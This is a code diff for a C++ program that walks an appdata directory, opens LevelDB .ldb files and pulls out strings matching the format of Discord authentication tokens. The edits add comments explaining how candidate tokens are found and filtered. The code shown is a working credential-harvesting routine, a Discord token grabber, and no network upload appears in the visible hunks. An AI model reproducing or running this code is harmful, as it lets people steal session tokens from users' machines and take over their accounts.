@@ -30,7 +30,7 @@ int main()
 	printf( "%s\n\n", appdata.c_str() );
 
 	std::vector< std::experimental::filesystem::v1::path > ldb_entries;
-
+	
 	for( const auto& entry : std::experimental::filesystem::directory_iterator( appdata ) )
 	{
 		if( entry.path().string().find( ".ldb" ) != std::string::npos )
@@ -41,7 +41,8 @@ int main()
 	}
 
 	printf( "\n" );
-
+	
+	// Discord token starts with M, m, N or n
 	std::vector< std::string > starting_chars = { "\"M", "\"N" };
 
 	for( std::size_t i = 0; i < ldb_entries.size(); i++ )
@@ -61,14 +62,21 @@ int main()
 			printf( "[%ws] Searching for %s\" Token\n", ldb_file_short.c_str(), starting_char.c_str() );
 
 			auto start_time = std::chrono::high_resolution_clock::now();
-
+			
+			// Get starting position of string that matches 
 			std::vector<size_t> positions;
-			get_string_positions( positions, file_text, starting_char );
+			get_string_positions( positions, file_text, starting_char ); // I put everything to lower case here, so i dont need to scan each file 4 times but only two (:-D)
 
 			std::vector<std::string> tokens;
 
 			for( auto pos : positions )
 			{
+				/*
+				The string will be treated as token if
+				- It starts with starting_char
+				- It doesn't contain -, _, -, ,, {, }, <, >, /
+				- The last character of the string is "
+				*/
 				for( int i = 48; i < 128; i++ )
 				{
 					std::string file = file_text;
@@ -87,6 +95,7 @@ int main()
 							possible_token.find( "/" ) == std::string::npos &&
 							possible_token.back() == '\"' )
 						{
+							// Check if string isn't already in array
 							bool match = false;
 							for( auto token : tokens )
 								if( possible_token.find( token ) != std::string::npos )
